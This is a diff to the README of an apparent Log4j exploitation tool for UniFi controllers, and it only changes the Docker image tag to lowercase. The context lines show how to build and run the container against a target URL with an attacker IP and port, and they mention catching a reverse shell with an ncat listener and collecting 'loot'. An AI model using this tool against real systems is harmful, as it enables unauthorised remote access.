@@ -40,13 +40,13 @@ Following that, execute the following command to clone the repository and build 
 
 ```
 git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jUnifi \
-    && cd Log4jUnifi && docker build -t Log4jUnifi .
+    && cd Log4jUnifi && docker build -t log4junifi .
 ```
 
 To run the container, run a command similar to the following with your command line flags appended. Note that the container will not catch the reverse shell. You need to create a ncat listener in a separate shell session:
 
 ```
-docker run -it -v $(pwd)/loot:/Log4jUnifi/loot -p 8090:8090 -p 1389:1389 Log4jUnifi \ 
+docker run -it -v $(pwd)/loot:/Log4jUnifi/loot -p 8090:8090 -p 1389:1389 log4junifi \ 
     -u https://unifi.acme.com:8443 -i 192.168.1.1 -p 4444
 ```
 
